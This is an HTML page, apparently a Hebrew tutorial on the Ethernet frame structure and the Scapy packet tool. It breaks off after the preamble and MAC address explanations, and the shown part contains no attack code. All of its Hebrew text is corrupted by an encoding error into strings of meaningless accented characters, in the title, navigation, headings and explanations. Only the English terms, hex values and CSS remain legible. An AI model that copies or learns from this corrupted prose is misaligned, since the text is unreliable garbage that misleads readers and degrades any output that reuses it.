<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>×¤×¨×•×˜×•×§×•×œ Ethernet + Scapy</title>
<link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;700;900&family=JetBrains+Mono:wght@300;400;500;700&family=Heebo:wght@400;700&display=swap" rel="stylesheet">
<style>
:root {
  --bg:        #030810;
  --bg2:       #060f1e;
  --panel:     #0a1628;
  --panel2:    #0e1f38;
  --panel3:    #122440;
  --border:    rgba(0,200,255,0.15);
  --border2:   rgba(0,200,255,0.3);
  --cyan:      #00d4ff;
  --green:     #00ff88;
  --orange:    #ff7b35;
  --yellow:    #ffd600;
  --pink:      #ff4f9b;
  --purple:    #a855f7;
  --red:       #ff4444;
  --text:      #ddeeff;
  --muted:     #5a7a9a;
  --muted2:    #8aaabb;
  --glow-c:    0 0 20px rgba(0,212,255,0.4);
  --glow-g:    0 0 20px rgba(0,255,136,0.4);
  --mono:      'JetBrains Mono', monospace;
}

/* â”€â”€â”€ RESET & BASE â”€â”€â”€ */
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { scroll-behavior: smooth; }
body {
  background: var(--bg);
  color: var(--text);
  font-family: 'Rubik', 'Heebo', sans-serif;
  overflow-x: hidden;
  line-height: 1.6;
}

/* Scanline overlay */
body::after {
  content: '';
  position: fixed;
  inset: 0;
  background: repeating-linear-gradient(
    0deg,
    rgba(0,0,0,0.03) 0px,
    rgba(0,0,0,0.03) 1px,
    transparent 1px,
    transparent 2px
  );
  pointer-events: none;
  z-index: 9999;
}

/* â”€â”€â”€ SCROLLBAR â”€â”€â”€ */
::-webkit-scrollbar { width: 6px; }
::-webkit-scrollbar-track { background: var(--bg); }
::-webkit-scrollbar-thumb { background: var(--panel3); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: var(--cyan); }

/* â”€â”€â”€ TOPBAR â”€â”€â”€ */
.topbar {
  position: fixed; top: 0; left: 0; right: 0;
  height: 52px;
  background: rgba(3,8,16,0.97);
  border-bottom: 1px solid var(--border);
  display: flex; align-items: center; justify-content: space-between;
  padding: 0 24px;
  z-index: 500;
  backdrop-filter: blur(20px);
}
.topbar-brand {
  display: flex; align-items: center; gap: 12px;
}
.topbar-logo {
  width: 32px; height: 32px;
  background: linear-gradient(135deg, var(--cyan), var(--green));
  border-radius: 6px;
  display: flex; align-items: center; justify-content: center;
  font-weight: 900; font-size: 16px; color: #000;
  font-family: var(--mono);
}
.topbar-title {
  font-family: var(--mono);
  font-size: 16px;
  color: var(--cyan);
  letter-spacing: 1px;
}
.topbar-nav {
  display: flex; gap: 4px;
}
.topbar-nav a {
  font-family: var(--mono);
  font-size: 16px;
  color: var(--muted);
  text-decoration: none;
  padding: 5px 12px;
  border-radius: 4px;
  letter-spacing: 0.5px;
  transition: all 0.2s;
  border: 1px solid transparent;
}
.topbar-nav a:hover { color: var(--cyan); border-color: var(--border); }
.topbar-nav a.active { color: var(--cyan); background: rgba(0,212,255,0.08); border-color: var(--border2); }

/* â”€â”€â”€ PROGRESS â”€â”€â”€ */
.progress-track {
  position: fixed; top: 52px; left: 0; right: 0;
  height: 2px; background: var(--panel2); z-index: 499;
}
.progress-fill {
  height: 100%;
  background: linear-gradient(90deg, var(--cyan), var(--green), var(--cyan));
  background-size: 200% 100%;
  animation: shimmer 3s linear infinite;
  transition: width 0.3s;
  box-shadow: 0 0 8px var(--cyan);
}
@keyframes shimmer { 0% { background-position: 0% 0%; } 100% { background-position: 200% 0%; } }

/* â”€â”€â”€ SIDEBAR â”€â”€â”€ */
.sidebar {
  position: fixed; right: 0; top: 52px; bottom: 0;
  width: 220px;
  background: rgba(3,8,16,0.95);
  border-left: 1px solid var(--border);
  padding: 24px 0;
  z-index: 400;
  overflow-y: auto;
}
.sidebar-section {
  padding: 0 16px;
  margin-bottom: 24px;
}
.sidebar-label {
  font-family: var(--mono);
  font-size: 16px;
  letter-spacing: 3px;
  color: var(--muted);
  text-transform: uppercase;
  margin-bottom: 8px;
  padding-right: 4px;
}
.sidebar-link {
  display: flex; align-items: center; gap: 10px;
  padding: 8px 12px;
  border-radius: 6px;
  text-decoration: none;
  font-size: 16px;
  color: var(--muted2);
  transition: all 0.2s;
  margin-bottom: 2px;
  border: 1px solid transparent;
  font-family: 'Rubik', sans-serif;
}
.sidebar-link:hover { color: var(--cyan); background: rgba(0,212,255,0.06); }
.sidebar-link.active { color: var(--cyan); background: rgba(0,212,255,0.1); border-color: var(--border); }
.sidebar-link .link-dot {
  width: 6px; height: 6px; border-radius: 50%;
  background: var(--muted); flex-shrink: 0; transition: all 0.2s;
}
.sidebar-link.active .link-dot { background: var(--cyan); box-shadow: var(--glow-c); }
.sidebar-link .link-badge {
  margin-right: auto;
  font-family: var(--mono);
  font-size: 16px;
  background: rgba(0,212,255,0.12);
  color: var(--cyan);
  padding: 1px 6px;
  border-radius: 3px;
}

/* â”€â”€â”€ MAIN CONTENT â”€â”€â”€ */
.main {
  margin-top: 54px;
  margin-right: 220px;
  padding: 0;
}

/* â”€â”€â”€ SECTIONS â”€â”€â”€ */
.section {
  min-height: 100vh;
  padding: 64px 56px;
  border-bottom: 1px solid var(--border);
  position: relative;
}
.section-hero {
  background: radial-gradient(ellipse 70% 50% at 30% 50%, rgba(0,212,255,0.04) 0%, transparent 70%),
              radial-gradient(ellipse 50% 60% at 80% 80%, rgba(0,255,136,0.03) 0%, transparent 60%);
}

/* â”€â”€â”€ HERO â”€â”€â”€ */
.hero-eyebrow {
  font-family: var(--mono);
  font-size: 16px;
  letter-spacing: 4px;
  color: var(--cyan);
  text-transform: uppercase;
  margin-bottom: 20px;
  display: flex; align-items: center; gap: 12px;
}
.hero-eyebrow::before {
  content: '';
  display: block;
  width: 40px; height: 1px;
  background: var(--cyan);
}
.hero-h1 {
  font-size: clamp(3rem, 7vw, 6.5rem);
  font-weight: 900;
  line-height: 0.95;
  margin-bottom: 24px;
}
.hero-h1 .line1 { display: block; color: var(--text); }
.hero-h1 .line2 {
  display: block;
  background: linear-gradient(90deg, var(--cyan) 0%, var(--green) 100%);
  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
  background-clip: text;
}
.hero-desc {
  max-width: 600px;
  color: var(--muted2);
  font-size: 16px;
  margin-bottom: 40px;
  line-height: 1.8;
}
.hero-stats {
  display: flex; gap: 40px; flex-wrap: wrap;
  margin-top: 40px;
  padding-top: 40px;
  border-top: 1px solid var(--border);
}
.hero-stat-val {
  font-family: var(--mono);
  font-size: 2rem;
  font-weight: 700;
  color: var(--cyan);
  display: block;
  line-height: 1;
}
.hero-stat-lbl { font-size: 16px; color: var(--muted); margin-top: 4px; }

/* â”€â”€â”€ SECTION HEADERS â”€â”€â”€ */
.sec-header { margin-bottom: 40px; }
.sec-tag {
  display: inline-block;
  font-family: var(--mono);
  font-size: 16px;
  letter-spacing: 3px;
  text-transform: uppercase;
  padding: 4px 12px;
  border-radius: 3px;
  margin-bottom: 12px;
}
.sec-tag-cyan { background: rgba(0,212,255,0.1); color: var(--cyan); border: 1px solid rgba(0,212,255,0.2); }
.sec-tag-green { background: rgba(0,255,136,0.1); color: var(--green); border: 1px solid rgba(0,255,136,0.2); }
.sec-tag-orange { background: rgba(255,123,53,0.1); color: var(--orange); border: 1px solid rgba(255,123,53,0.2); }
.sec-tag-purple { background: rgba(168,85,247,0.1); color: var(--purple); border: 1px solid rgba(168,85,247,0.2); }
.sec-h2 {
  font-size: clamp(1.8rem, 3.5vw, 2.8rem);
  font-weight: 800;
  line-height: 1.1;
  margin-bottom: 8px;
}
.sec-lead { color: var(--muted2); font-size: 16px; max-width: 700px; line-height: 1.7; }

/* â”€â”€â”€ FRAME BUILDER â”€â”€â”€ */
.frame-wrap {
  background: var(--panel);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 32px;
  margin-bottom: 32px;
}
.frame-title {
  font-family: var(--mono);
  font-size: 16px;
  letter-spacing: 3px;
  color: var(--muted);
  text-transform: uppercase;
  margin-bottom: 20px;
}
.frame-row {
  display: flex;
  gap: 3px;
  overflow-x: auto;
  padding-bottom: 12px;
}
.frame-field {
  border-radius: 6px;
  padding: 0;
  text-align: center;
  flex-shrink: 0;
  cursor: pointer;
  transition: transform 0.2s, box-shadow 0.2s;
  overflow: hidden;
  border: 1px solid transparent;
  min-height: 80px;
  display: flex; flex-direction: column;
}
.frame-field:hover { transform: translateY(-6px); z-index: 10; }
.frame-field.active { transform: translateY(-8px); z-index: 20; }
.ff-header {
  padding: 8px 6px 4px;
  font-family: var(--mono);
  font-weight: 700;
  font-size: 16px;
  letter-spacing: 0.5px;
}
.ff-size {
  padding: 0 6px 8px;
  font-size: 16px;
  opacity: 0.75;
  font-family: var(--mono);
}

/* Field colors */
.ff-preamble  { background: rgba(90,100,140,0.2);  border-color: rgba(90,100,140,0.4);  }
.ff-preamble  .ff-header { color: #8090bb; }
.ff-dst       { background: rgba(255,75,75,0.15);   border-color: rgba(255,75,75,0.35);   }
.ff-dst       .ff-header { color: var(--orange); }
.ff-src       { background: rgba(0,212,255,0.12);   border-color: rgba(0,212,255,0.3);    }
.ff-src       .ff-header { color: var(--cyan); }
.ff-type      { background: rgba(255,214,0,0.12);   border-color: rgba(255,214,0,0.3);    }
.ff-type      .ff-header { color: var(--yellow); }
.ff-data      { background: rgba(0,255,136,0.1);    border-color: rgba(0,255,136,0.25);   }
.ff-data      .ff-header { color: var(--green); }
.ff-crc       { background: rgba(168,85,247,0.12);  border-color: rgba(168,85,247,0.3);   }
.ff-crc       .ff-header { color: var(--purple); }

.frame-field.active .ff-header { text-shadow: 0 0 8px currentColor; }

/* Width map */
.w-preamble { width: 90px; }
.w-mac      { width: 110px; }
.w-type     { width: 80px; }
.w-data     { flex: 1; min-width: 180px; }
.w-crc      { width: 80px; }

/* Detail panel */
.field-detail {
  background: var(--panel2);
  border: 1px solid var(--border);
  border-radius: 10px;
  padding: 24px;
  display: none;
  animation: fadeDown 0.25s ease;
}
.field-detail.show { display: block; }
@keyframes fadeDown {
  from { opacity: 0; transform: translateY(-10px); }
  to   { opacity: 1; transform: translateY(0); }
}
.fd-name {
  font-family: var(--mono);
  font-size: 16px;
  font-weight: 700;
  margin-bottom: 4px;
}
.fd-sub { color: var(--muted2); font-size: 16px; margin-bottom: 16px; }
.fd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
.fd-block { }
.fd-block-title {
  font-family: var(--mono);
  font-size: 16px;
  letter-spacing: 2px;
  color: var(--muted);
  text-transform: uppercase;
  margin-bottom: 8px;
}
.fd-block-body { color: var(--muted2); font-size: 16px; line-height: 1.7; }
.fd-block-body strong { color: var(--text); }
.fd-example {
  margin-top: 12px;
  background: var(--panel);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 12px 16px;
  font-family: var(--mono);
  font-size: 16px;
}
.ex-label { font-size: 16px; letter-spacing: 2px; text-transform: uppercase; color: var(--muted); margin-bottom: 6px; }
.ex-val { color: var(--cyan); }

/* â”€â”€â”€ CODE BLOCKS â”€â”€â”€ */
.code-wrap {
  background: #010810;
  border: 1px solid var(--border);
  border-radius: 10px;
  overflow: hidden;
  margin: 16px 0;
}
.code-header {
  display: flex; align-items: center; justify-content: space-between;
  background: var(--panel);
  padding: 10px 16px;
  border-bottom: 1px solid var(--border);
}
.code-dots { display: flex; gap: 6px; }
.code-dots span {
  width: 10px; height: 10px; border-radius: 50%;
}
.code-dots .d1 { background: var(--red); }
.code-dots .d2 { background: var(--yellow); }
.code-dots .d3 { background: var(--green); }
.code-lang {
  font-family: var(--mono);
  font-size: 16px;
  color: var(--muted);
  letter-spacing: 2px;
  text-transform: uppercase;
}
.copy-btn {
  background: rgba(0,212,255,0.1);
  border: 1px solid var(--border);
  color: var(--cyan);
  font-family: var(--mono);
  font-size: 16px;
  padding: 4px 12px;
  border-radius: 4px;
  cursor: pointer;
  transition: all 0.2s;
}
.copy-btn:hover { background: rgba(0,212,255,0.2); }
.copy-btn.copied { color: var(--green); border-color: rgba(0,255,136,0.3); }
pre {
  padding: 20px;
  overflow-x: auto;
  font-family: var(--mono);
  font-size: 16px;
  line-height: 1.7;
  tab-size: 4;
  direction: ltr;
}
pre .cm  { color: #4a6080; }           /* comment */
pre .kw  { color: #c792ea; }           /* keyword */
pre .fn  { color: #82aaff; }           /* function */
pre .str { color: #c3e88d; }           /* string */
pre .num { color: var(--orange); }     /* number */
pre .op  { color: var(--cyan); }       /* operator/builtin */
pre .var { color: var(--text); }       /* variable */
pre .mac { color: var(--yellow); }     /* mac address */
pre .ip  { color: #f78c6c; }          /* ip */
pre .hx  { color: #89ddff; }          /* hex */
pre .out { color: var(--green); }      /* output */
pre .err { color: var(--red); }        /* error */
pre .pmt { color: var(--muted); }      /* prompt */

/* â”€â”€â”€ INFO CARDS â”€â”€â”€ */
.cards-grid { display: grid; gap: 16px; }
.cg-2 { grid-template-columns: 1fr 1fr; }
.cg-3 { grid-template-columns: 1fr 1fr 1fr; }
.info-card {
  background: var(--panel);
  border: 1px solid var(--border);
  border-radius: 10px;
  padding: 24px;
  transition: all 0.25s;
}
.info-card:hover { border-color: var(--border2); transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,0,0,0.3); }
.ic-icon { font-size: 1.8rem; margin-bottom: 12px; }
.ic-title { font-family: var(--mono); font-size: 16px; font-weight: 700; margin-bottom: 8px; }
.ic-body { color: var(--muted2); font-size: 16px; line-height: 1.7; }
.ic-body strong { color: var(--text); }
.ic-body code { font-family: var(--mono); background: rgba(0,212,255,0.1); color: var(--cyan); padding: 1px 6px; border-radius: 3px; font-size: 1.2em; }

/* Border accent variants */
.bc-cyan   { border-right: 3px solid var(--cyan); }
.bc-green  { border-right: 3px solid var(--green); }
.bc-orange { border-right: 3px solid var(--orange); }
.bc-yellow { border-right: 3px solid var(--yellow); }
.bc-purple { border-right: 3px solid var(--purple); }
.bc-pink   { border-right: 3px solid var(--pink); }
.bc-red    { border-right: 3px solid var(--red); }

/* â”€â”€â”€ ALERT / CALLOUT â”€â”€â”€ */
.callout {
  border-radius: 8px;
  padding: 16px 20px;
  margin: 16px 0;
  font-size: 16px;
  line-height: 1.7;
  display: flex; gap: 12px; align-items: flex-start;
}
.callout-icon { font-size: 16px; flex-shrink: 0; margin-top: 2px; }
.callout-body strong { color: var(--text); }
.callout-body { color: var(--muted2); }
.ca-cyan   { background: rgba(0,212,255,0.06); border: 1px solid rgba(0,212,255,0.2); }
.ca-orange { background: rgba(255,123,53,0.06); border: 1px solid rgba(255,123,53,0.2); }
.ca-green  { background: rgba(0,255,136,0.06); border: 1px solid rgba(0,255,136,0.2); }
.ca-red    { background: rgba(255,68,68,0.06);  border: 1px solid rgba(255,68,68,0.2); }

/* â”€â”€â”€ ETHERTYPE TABLE â”€â”€â”€ */
.etype-table {
  width: 100%;
  border-collapse: collapse;
  font-size: 16px;
  font-family: var(--mono);
}
.etype-table th {
  background: var(--panel2);
  padding: 12px 16px;
  text-align: right;
  font-size: 16px;
  letter-spacing: 2px;
  color: var(--muted);
  text-transform: uppercase;
  border-bottom: 2px solid var(--border2);
}
.etype-table td {
  padding: 12px 16px;
  border-bottom: 1px solid var(--border);
  color: var(--muted2);
}
.etype-table tr:hover td { background: rgba(0,212,255,0.03); }
.etype-table tr:last-child td { border-bottom: none; }
.etype-val { color: var(--cyan); font-weight: 700; }
.etype-proto { color: var(--text); }

/* â”€â”€â”€ SCAPY SECTION â”€â”€â”€ */
.scapy-logo {
  font-family: var(--mono);
  font-size: 3rem;
  font-weight: 900;
  background: linear-gradient(90deg, var(--green), var(--cyan));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
  background-clip: text;
  line-height: 1;
  margin-bottom: 8px;
}
.layer-pill {
  display: inline-flex; align-items: center; gap: 6px;
  padding: 6px 14px;
  border-radius: 20px;
  font-family: var(--mono);
  font-size: 16px;
  font-weight: 700;
  cursor: default;
}
.lp-eth    { background: rgba(0,212,255,0.15); color: var(--cyan); border: 1px solid rgba(0,212,255,0.3); }
.lp-ip     { background: rgba(255,123,53,0.15); color: var(--orange); border: 1px solid rgba(255,123,53,0.3); }
.lp-tcp    { background: rgba(0,255,136,0.12); color: var(--green); border: 1px solid rgba(0,255,136,0.25); }
.lp-udp    { background: rgba(168,85,247,0.12); color: var(--purple); border: 1px solid rgba(168,85,247,0.25); }
.lp-arp    { background: rgba(255,214,0,0.12); color: var(--yellow); border: 1px solid rgba(255,214,0,0.25); }
.lp-icmp   { background: rgba(255,75,155,0.12); color: var(--pink); border: 1px solid rgba(255,75,155,0.25); }
.lp-raw    { background: rgba(90,100,140,0.2); color: #8090bb; border: 1px solid rgba(90,100,140,0.3); }

.slash-sep {
  font-family: var(--mono);
  color: var(--muted);
  font-size: 1.4rem;
  font-weight: 700;
  padding: 0 4px;
}

.packet-builder {
  display: flex; align-items: center; gap: 8px;
  flex-wrap: wrap;
  padding: 16px;
  background: var(--panel);
  border: 1px solid var(--border);
  border-radius: 8px;
  margin: 12px 0;
}

/* â”€â”€â”€ OUTPUT BLOCK â”€â”€â”€ */
.output-block {
  background: #010508;
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 16px 20px;
  font-family: var(--mono);
  font-size: 16px;
  line-height: 1.9;
  overflow-x: auto;
  margin: 8px 0;
}
.ob-prompt { color: var(--muted); }
.ob-result { color: var(--green); }
.ob-field  { color: var(--cyan); }
.ob-val    { color: var(--orange); }
.ob-sep    { color: var(--muted); }

/* â”€â”€â”€ TABS â”€â”€â”€ */
.tabs-header {
  display: flex; gap: 4px;
  border-bottom: 1px solid var(--border);
  margin-bottom: 24px;
}
.tab-btn {
  background: none;
  border: none;
  padding: 10px 20px;
  font-family: var(--mono);
  font-size: 16px;
  letter-spacing: 1px;
  color: var(--muted);
  cursor: pointer;
  border-bottom: 2px solid transparent;
  margin-bottom: -1px;
  transition: all 0.2s;
  text-transform: uppercase;
}
.tab-btn:hover { color: var(--text); }
.tab-btn.active { color: var(--cyan); border-bottom-color: var(--cyan); }
.tab-pane { display: none; }
.tab-pane.active { display: block; }

/* â”€â”€â”€ SNIFF TABLE â”€â”€â”€ */
.sniff-table { width: 100%; border-collapse: collapse; font-size: 16px; }
.sniff-table th {
  background: var(--panel2);
  padding: 10px 14px;
  text-align: right;
  font-family: var(--mono);
  font-size: 16px;
  letter-spacing: 2px;
  color: var(--muted);
  text-transform: uppercase;
  border-bottom: 1px solid var(--border2);
}
.sniff-table td {
  padding: 9px 14px;
  border-bottom: 1px solid var(--border);
  font-family: var(--mono);
  font-size: 16px;
}
.sniff-table tr:hover td { background: rgba(0,212,255,0.03); cursor: pointer; }
.sniff-num { color: var(--muted); }
.sniff-time { color: var(--muted2); }
.sniff-mac-src { color: var(--cyan); }
.sniff-mac-dst { color: var(--orange); }
.sniff-proto { }
.proto-ip   { color: var(--green); }
.proto-arp  { color: var(--yellow); }
.proto-ipv6 { color: var(--purple); }
.sniff-len  { color: var(--muted2); }
.sniff-info { color: var(--text); }

/* â”€â”€â”€ TWO COL â”€â”€â”€ */
.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 32px; }
.three-col { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 24px; }

/* â”€â”€â”€ ANIMATIONS â”€â”€â”€ */
.reveal { opacity: 0; transform: translateY(24px); transition: opacity 0.6s ease, transform 0.6s ease; }
.reveal.visible { opacity: 1; transform: translateY(0); }

/* â”€â”€â”€ INLINE UTIL â”€â”€â”€ */
.mt8  { margin-top: 8px; }
.mt16 { margin-top: 16px; }
.mt24 { margin-top: 24px; }
.mt32 { margin-top: 32px; }
.mb16 { margin-bottom: 16px; }
.mb24 { margin-bottom: 24px; }
.gap-pills { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin: 12px 0; }
hr.sec-divider { border: none; border-top: 1px solid var(--border); margin: 40px 0; }

/* â”€â”€â”€ MEDIA â”€â”€â”€ */
@media (max-width: 1100px) {
  .sidebar { display: none; }
  .main { margin-right: 0; }
  .topbar-nav { display: none; }
  .two-col, .cg-2, .cg-3, .three-col { grid-template-columns: 1fr; }
  .section { padding: 48px 24px; }
}
</style>
</head>
<body>

<!-- TOPBAR -->
<div class="topbar">
  <div class="topbar-brand">
    <div class="topbar-logo">Î</div>
    <div class="topbar-title">Ethernet Protocol &amp; Scapy</div>
  </div>
  <nav class="topbar-nav">
    <a href="#sec-intro"   class="active" data-sec="sec-intro">××‘× ×”</a>
    <a href="#sec-fields"  data-sec="sec-fields">×©×“×•×ª</a>
    <a href="#sec-etype"   data-sec="sec-etype">EtherType</a>
    <a href="#sec-scapy"   data-sec="sec-scapy">Scapy</a>
    <a href="#sec-sniff"   data-sec="sec-sniff">Sniffing</a>
    <a href="#sec-craft"   data-sec="sec-craft">Crafting</a>
  </nav>
</div>

<!-- PROGRESS -->
<div class="progress-track"><div class="progress-fill" id="prog" style="width:0%"></div></div>

<!-- SIDEBAR -->
<aside class="sidebar">
  <div class="sidebar-section">
    <div class="sidebar-label">// ××‘× ×”</div>
    <a href="#sec-intro"  class="sidebar-link active" data-sec="sec-intro"><span class="link-dot"></span>××‘×•× ×œ-Ethernet</a>
    <a href="#sec-fields" class="sidebar-link" data-sec="sec-fields"><span class="link-dot"></span>×©×“×•×ª ×”××¡×’×¨×ª</a>
    <a href="#sec-etype"  class="sidebar-link" data-sec="sec-etype"><span class="link-dot"></span>EtherType <span class="link-badge">×˜×‘×œ×”</span></a>
  </div>
  <div class="sidebar-section">
    <div class="sidebar-label">// Scapy</div>
    <a href="#sec-scapy" class="sidebar-link" data-sec="sec-scapy"><span class="link-dot"></span>××‘×•× ×œ-Scapy</a>
    <a href="#sec-sniff" class="sidebar-link" data-sec="sec-sniff"><span class="link-dot"></span>Sniffing ×ª× ×•×¢×”</a>
    <a href="#sec-craft" class="sidebar-link" data-sec="sec-craft"><span class="link-dot"></span>Crafting ××¡×’×¨×•×ª</a>
  </div>
</aside>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<main class="main">

<!-- â”€â”€â”€ SEC 1: INTRO â”€â”€â”€ -->
<section class="section section-hero" id="sec-intro">
  <div class="hero-eyebrow">×¤×¨×•×˜×•×§×•×œ ×©×›×‘×ª ×”×§×• â€” IEEE 802.3</div>
  <h1 class="hero-h1">
    <span class="line1">×¤×¨×•×˜×•×§×•×œ</span>
    <span class="line2">Ethernet</span>
  </h1>
  <p class="hero-desc">
    ×¤×¨×•×˜×•×§×•×œ Ethernet ×”×•× ×”×¤×¨×•×˜×•×§×•×œ ×”× ×¤×•×¥ ×‘×™×•×ª×¨ ×‘×©×›×‘×ª ×”×§×• (Data Link Layer).
    ×”×•× ××’×“×™×¨ ×›×™×¦×“ × ×ª×•× ×™× ×××•×¡×’×¨×™× ×•××•×¢×‘×¨×™× ×‘×™×Ÿ ×©×ª×™ ×™×©×•×™×•×ª ×”×§×©×•×¨×•×ª ×™×©×™×¨×•×ª ×‘×¨×©×ª ×§×•×•×™×ª.
    ×›×œ ×“×‘×¨ ×©×¢×•×‘×¨ ×¢×œ ×”×¨×©×ª â€” HTTP, DNS, ARP â€” ×¢×˜×•×£ ×‘×ª×•×š ××¡×’×¨×ª Ethernet.
  </p>

  <div class="hero-stats reveal">
    <div>
      <span class="hero-stat-val">802.3</span>
      <div class="hero-stat-lbl">×ª×§×Ÿ IEEE</div>
    </div>
    <div>
      <span class="hero-stat-val">1500</span>
      <div class="hero-stat-lbl">bytes ××§×¡×™××•× payload (MTU)</div>
    </div>
    <div>
      <span class="hero-stat-val">6</span>
      <div class="hero-stat-lbl">bytes ×œ×›×œ ×›×ª×•×‘×ª MAC</div>
    </div>
    <div>
      <span class="hero-stat-val">64â€“1518</span>
      <div class="hero-stat-lbl">bytes ×’×•×“×œ ××¡×’×¨×ª</div>
    </div>
  </div>

  <hr class="sec-divider">

  <!-- INTERACTIVE FRAME -->
  <div class="reveal mt32">
    <div class="frame-wrap">
      <div class="frame-title">// ××¡×’×¨×ª ethernet â€” ×œ×—×¥ ×¢×œ ×©×“×” ×œ×¤×¨×˜×™×</div>
      <div class="frame-row">
        <div class="frame-field ff-preamble w-preamble" onclick="showField('preamble')">
          <div class="ff-header">Preamble<br>+ SFD</div>
          <div class="ff-size">8 bytes</div>
        </div>
        <div class="frame-field ff-dst w-mac" onclick="showField('dst')">
          <div class="ff-header">Destination<br>MAC</div>
          <div class="ff-size">6 bytes</div>
        </div>
        <div class="frame-field ff-src w-mac" onclick="showField('src')">
          <div class="ff-header">Source<br>MAC</div>
          <div class="ff-size">6 bytes</div>
        </div>
        <div class="frame-field ff-type w-type" onclick="showField('type')">
          <div class="ff-header">Ether<br>Type</div>
          <div class="ff-size">2 bytes</div>
        </div>
        <div class="frame-field ff-data w-data" onclick="showField('data')">
          <div class="ff-header">Data / Payload</div>
          <div class="ff-size">46â€“1500 bytes</div>
        </div>
        <div class="frame-field ff-crc w-crc" onclick="showField('crc')">
          <div class="ff-header">CRC /<br>FCS</div>
          <div class="ff-size">4 bytes</div>
        </div>
      </div>

      <div id="field-detail" class="field-detail mt16"></div>
    </div>
  </div>

  <div class="callout ca-cyan reveal">
    <div class="callout-icon">ğŸ’¡</div>
    <div class="callout-body">
      <strong>×”×¨×¢×™×•×Ÿ ×”××¨×›×–×™:</strong> ×©×›×‘×ª ×”×§×• ×¢×•×˜×¤×ª ××ª ×”×—×‘×™×œ×” ××”×©×›×‘×•×ª ×”×’×‘×•×”×•×ª ×™×•×ª×¨ (IP, TCP, HTTP...)
      ×‘×ª×•×š ××¡×’×¨×ª ×¢× ×›×ª×•×‘×•×ª MAC ×›×“×™ ×©×ª×•×›×œ ×œ×¢×‘×•×¨ ×‘×™×Ÿ ×©×ª×™ ×™×©×•×™×•×ª ×¡××•×›×•×ª ×¢×œ ××•×ª×• ×ª×•×•×š ×¤×™×–×™.
    </div>
  </div>
</section>

<!-- â”€â”€â”€ SEC 2: FIELDS IN DEPTH â”€â”€â”€ -->
<section class="section" id="sec-fields">
  <div class="sec-header">
    <div class="sec-tag sec-tag-cyan">// ×©×“×•×ª ×”××¡×’×¨×ª</div>
    <h2 class="sec-h2">×›×œ ×©×“×” â€” ×‘×¢×•××§</h2>
    <p class="sec-lead">× ×¡×‘×™×¨ ×›×œ ×©×“×” ×‘××¡×’×¨×ª Ethernet, ××”×•, ××” ×’×•×“×œ×•, ×•××” × ×™×ª×Ÿ ×œ×œ××•×“ ××× ×• ×‘×–××Ÿ × ×™×ª×•×— ×ª× ×•×¢×”.</p>
  </div>

  <!-- PREAMBLE -->
  <div class="reveal mb24">
    <div class="info-card bc-cyan">
      <div class="two-col" style="gap:24px; align-items:start">
        <div>
          <div class="ic-icon">â±</div>
          <div class="ic-title" style="color:var(--cyan); font-size: 16px;">Preamble + SFD â€” 8 ×‘×ª×™×</div>
          <div class="ic-body mt8">
            ×”-Preamble ××•×¨×›×‘ ×-<strong>7 ×‘×ª×™×</strong> ×©×œ ×”×¨×¦×£ <code>10101010</code> (0xAA) ×©× ×•×¢×“ <strong>×œ×¡× ×›×¨×Ÿ ××ª ×”×¦×“×“×™×</strong> â€” ×”× ××¢×Ÿ ××‘×™×Ÿ ×©××¡×’×¨×ª ×—×“×©×” ×¢×•××“×ª ×œ×”×ª×—×™×œ.<br><br>
            ×”-<strong>SFD (Start Frame Delimiter)</strong> ×”×•× ×”×‘×™×ª ×”-8 ×‘×“×™×•×§ â€” ×”×¢×¨×š <code>10101011</code> (0xAB) â€” ×•××¡××Ÿ ××ª ×ª×—×™×œ×ª ×”××¡×’×¨×ª ×‘×¤×•×¢×œ.
          </div>
        </div>
        <div>
          <div class="fd-example">
            <div class="ex-label">// ×¢×¨×š ×”-Preamble</div>
            <pre style="padding:0; margin-top:6px; font-size: 16px; background:none;"><span class="hx">AA AA AA AA AA AA AA</span>  <span class="cm">â† 7 bytes preamble</span>
<span class="hx">AB</span>                      <span class="cm">â† SFD (1 byte)</span></pre>
          </div>
          <div class="callout ca-orange mt8" style="font-size: 16px;">
            <div class="callout-icon">âš ï¸</div>
            <div class="callout-body"><strong>×©×™× ×œ×‘:</strong> Wireshark ×•-Scapy ×‘×“×¨×š ×›×œ×œ <strong>×œ× ××¦×™×’×™×</strong> ××ª ×”-Preamble â€” ×”×•× ××•×¡×¨ ×¢"×™ ×”-NIC ×œ×¤× ×™ ×©×”× ×ª×•×Ÿ ××’×™×¢ ×œ×ª×•×›× ×”.</div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- MAC FIELDS -->
  <div class="reveal mb24">
    <div class="info-card bc-orange">
      <div class="ic-title" style="color:var(--orange); font-size: 16px; margin-bottom:16px;">ğŸ¯ Destination MAC + Source MAC â€” 6 ×‘×ª×™× ×›×œ ××—×“</div>
      <div class="two-col" style="gap:24px;">
        <div>
          <div class="ic-body">
            ×›×ª×•×‘×ª MAC (Media Access Control) ×”×™× <strong>48 ×‘×™×˜</strong> â€” 6 ×‘×ª×™× ×”×›×ª×•×‘×™× ×‘×”×§×¡×“×¦×™××œ×™:
            <br><br>
            <strong>3 ×‘×ª×™× ×¨××©×•× ×™× (OUI):</strong> ××–×”×” ×™×¦×¨×Ÿ (Organizationally Unique Identifier)<br>
            <strong>3 ×‘×ª×™× ××—×¨×•× ×™× (NIC):</strong> ×™×™×—×•×“×™ ×œ×›×¨×˜×™×¡ ×”×¨×©×ª ×”×¡×¤×¦×™×¤×™
          </div>
          <div class="fd-example mt8">
            <div class="ex-label">// ××‘× ×” MAC</div>
